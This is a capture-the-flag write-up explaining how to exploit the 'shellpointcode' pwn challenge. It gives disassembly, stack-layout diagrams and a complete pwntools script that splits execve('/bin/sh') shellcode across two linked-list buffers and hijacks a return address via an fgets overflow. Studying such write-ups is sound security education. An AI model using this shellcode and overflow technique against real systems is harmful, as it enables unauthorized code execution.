# shell->code

| Category | Points |
|:---------|-------:|
| pwn      | 100    |

### Description
> Linked lists are great! They let you chain pieces of data together.

## Write-up
This is a classic buffer overflow, made more interesting by space constraints.

The description heavily hints at storing shellcode in linked lists.
Let's first see what we're dealing with.
```sh
$ pwn checksec shellpointcode
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
```
No canary, RWX stack: no surprises here. This is a stack overflow alright.
Do we, perhaps, have a handy `gets` call to complete the combo?
```
$ r2 -AA shellpointcode
# ...
[0x00000720]> f | grep gets
0x00200fc0 8 reloc.fgets
0x000006e0 6 sym.imp.fgets
```
No, that would be too easy. We do have a call to `fgets` though:
```
[0x00000720]> axt @ sym.imp.fgets
sym.goodbye 0x8cf [CALL] call sym.imp.fgets
```
It's a long shot, but let's check it out.
```asm
/ (fcn) sym.goodbye 71
|   sym.goodbye ();
|           ; var char *s @ rbp-0x3
# ...
|           0x000008c3      488d45fd       lea rax, qword [s]
|           0x000008c7      be20000000     mov esi, 0x20               ; "@" ; int size
|           0x000008cc      4889c7         mov rdi, rax                ; char *s
|           0x000008cf      e80cfeffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
# ...
|           0x000008ed      c9             leave
\           0x000008ee      c3             ret
```
Surprisingly enough, that is it -- the `size` is way too big for the buffer!
We can overflow here alright. We don't know where to return, however.
Hopefully the program leaks a stack address somewhere: let's run it and check.
```
$ ./shellpointcode
Linked lists are great!
They let you chain pieces of data together.

(15 bytes) Text for node 1:
test
(15 bytes) Text for node 2:
test
node1:
node.next: 0x7fff0709aa90
node.buffer: test

What are your initials?

Thanks

```
There's the leak. Could we compute the offset to `s` in `goodbye` from there?
Sure. This is the route we initally went down, but it turned out to be
fruitless, because of the frame structure in `goodbye`:
```
-----------
           |
           |
  13 bytes | FREE
           |
           |
-----------
           |
  8 bytes  | return address
           |
----------- <- [rsp will be here after leave]
           |
  8 bytes  | old rbp
           |
----------- <- rbp
  3 bytes  |
----------- <- rbp - 0x3 (buffer start)
```
Although we can write 32 bytes, the payload can reside only in 11 + 13 = 24 of them
that are not storing the return address. This turns out to be too few.

Since the shellcode will be split, we will need to make a relative jump, which will
eat two bytes. Also, rsp is too close after leave: after just one 8-byte push
further pushes will start overwriting shellcode in the upper 13-byte region!
Adjusting `rsp` will take at least another two bytes.
At this point, we only have 20 bytes left.
The shortest [known `execve(/bin/sh)` shellcode](https://www.exploit-db.com/exploits/41750/) is 21 bytes.

Abandoning this idea, the next best place to put shellcode seems to
be in the buffers we fill right before the address is leaked:
the program even prints their sizes; the hint could not be more transparent.
This happens in `sym.nononode`:
```asm
/ (fcn) sym.nononode 119
|   sym.nononode ();
|           ; var int local_40h @ rbp-0x40
|           ; var int local_20h @ rbp-0x20
|           ; CALL XREF from sym.main (0x9b7)
|           0x000008ef b    55             push rbp
|           0x000008f0      4889e5         mov rbp, rsp
|           0x000008f3      4883ec40       sub rsp, 0x40
|           0x000008f7      488d45c0       lea rax, qword [local_40h]
|           0x000008fb      488945e0       mov qword [local_20h], rax
|           0x000008ff      488d3d940100.  lea rdi, qword str.15_bytes
|           0x00000906      e8b5fdffff     call sym.imp.puts
|           0x0000090b      488d45e0       lea rax, qword [local_20h]
|           0x0000090f      4883c008       add rax, 8
|           0x00000913      be0f000000     mov esi, 0xf
|           0x00000918      4889c7         mov rdi, rax
|           0x0000091b      e83cffffff     call sym.readline
# ...
```
After quickly checking `sym.readline`, we concede that there is no overflow there:
```asm
/ (fcn) sym.readline 76
|   sym.readline (char *arg1, size_t arg2);
|           ; var size_t local_20h @ rbp-0x20
|           ; var char *dest @ rbp-0x18
|           ; var int local_10h @ rbp-0x10
|           ; var char *src @ rbp-0x8
|           ; arg char *arg1 @ rdi
|           ; arg size_t arg2 @ rsi
|           ; CALL XREFS from sym.nononode (0x91b, 0x93c)
|           0x0000085c      55             push rbp
|           0x0000085d      4889e5         mov rbp, rsp
|           0x00000860      4883ec20       sub rsp, 0x20
|           0x00000864      48897de8       mov qword [dest], rdi       ; arg1
|           0x00000868      488975e0       mov qword [local_20h], rsi  ; arg2
|           0x0000086c      48c745f80000.  mov qword [src], 0
|           0x00000874      488b15a50720.  mov rdx, qword [obj.stdin]  ; [0x201020:8]=0
|           0x0000087b      488d4df0       lea rcx, qword [local_10h]
|           0x0000087f      488d45f8       lea rax, qword [src]
|           0x00000883      4889ce         mov rsi, rcx
|           0x00000886      4889c7         mov rdi, rax
|           0x00000889      e872feffff     call sym.imp.getline
|           0x0000088e      488b4df8       mov rcx, qword [src]
|           0x00000892      488b55e0       mov rdx, qword [local_20h]  ; size_t  n
|           0x00000896      488b45e8       mov rax, qword [dest]
|           0x0000089a      4889ce         mov rsi, rcx                ; const char *src
|           0x0000089d      4889c7         mov rdi, rax                ; char *dest
|           0x000008a0      e80bfeffff     call sym.imp.strncpy        ; char *strncpy(char *dest, const char *src, size_t  n)
|           0x000008a5      90             nop
|           0x000008a6      c9             leave
\           0x000008a7      c3             ret
```
We are not too saddened by this: we already have an overflow site.
The stack layout in `sym.nononode` is this:
```
  ----------- <- rbp
  |         |
  |  buf_2  |  0x18 bytes
  |         |
  -----------
->| next_2  |  0x08 bytes
| ----------- <- rbp - 0x20
| |         |
| |  buf_1  |  0x18 bytes
| |         |
| -----------
--| next_1  |  0x08 bytes
  ----------- <- rbp - 0x40
```
Though `buf_1` and `buf_2` are large enough individually to hold all of our shellcode,
the `0xf` passed to `sym.readline` limits us to 15 bytes stored per buffer.

This is exactly the linked list hinted at in the description! It all comes together.
The recipe for success at this point is clear:
1. Split shellcode into two parts, `shc1` and `shc2`, with a jump from `shc1` to `shc2`.
2. Store the two parts in `buf_1` and `buf_2`.
3. Overwrite the return address in `sym.goodbye` with the start address of `buf_1`.
This is accompished with the following `pwnlib`-based code:
```python
from pwn import *

context.arch = 'amd64'

# Hand-crafted shellcode to fit in 2 x 15 bytes
shc1 = '''
movabs rbx, 0x68732f2f6e69622f  ; /bin//sh
'''
shc1 = asm(shc1)
# pwn.asm won't assemble this; we must do it by hand
offset = (0x18 - len(shc1)) + 0x8  # buffer is 0x18 bytes, then 0x8 for next ptr
# [jump short rel8] is [0xeb [offset - 2]] because offset is from instr start
shc1 += b'\xeb' + p8(offset - 2)
print('shc1 is %d bytes' % len(shc1))
assert(len(shc1) <= 15)

shc2 = '''
xor esi, esi
push rsi
push rbx
push rsp
pop rdi
push 59
pop rax
syscall
'''
shc2 = asm(shc2)
print('shc2 is %d bytes' % len(shc2))
assert(len(shc2) <= 15)

print(disasm(shc1 + shc2))

r = remote('pwn.chal.csaw.io', 9005)

# send in reverse order as second buffer is filled first
r.sendline(shc2)
r.sendline(shc1)

r.recvuntil('node.next: ')
bottom = int(r.recvline(), 16)
print('node.next @ %x' % bottom)
dest = p64(bottom + 0x08)   # next pointer is 0x8 bytes, then shellcode

r.sendline(b'\xff' * (0x8 + 0x3) + dest)  # buffer: 0x3, old rbp: 0x8, then return addr

r.clean()
r.interactive()
```
Note also that shellcode here is 12 + 11 bytes _with_ the jump, so we only barely
couldn't fit into the buffer in `sym.goodbye` (if only `rsp` was farther!)

When this runs, all that remains is to print the flag:
```sh
$ ls
flag.txt
shellpointcode
$ cat flag.txt
flag{NONONODE_YOU_WRECKED_BRO}
```
